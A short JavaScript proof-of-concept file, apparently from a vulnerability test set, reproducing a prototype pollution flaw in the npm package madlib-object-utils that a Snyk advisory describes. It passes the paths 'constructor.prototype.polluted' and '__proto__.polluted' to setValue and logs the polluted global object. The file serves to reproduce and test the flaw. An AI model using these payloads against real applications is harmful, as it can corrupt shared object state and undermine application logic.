// //https://snyk.io/vuln/SNYK-JS-MADLIBOBJECTUTILS-598676
// test("prototype pollution in madlib-object-utils", () => {
console.log({}.polluted);

  const objectUtils = require("madlib-object-utils");
  //objectUtils.setValue("__proto__.polluted", {}, "yes");
objectUtils.setValue("constructor.prototype.polluted", {}, "yes");
console.log({}.polluted);
// });
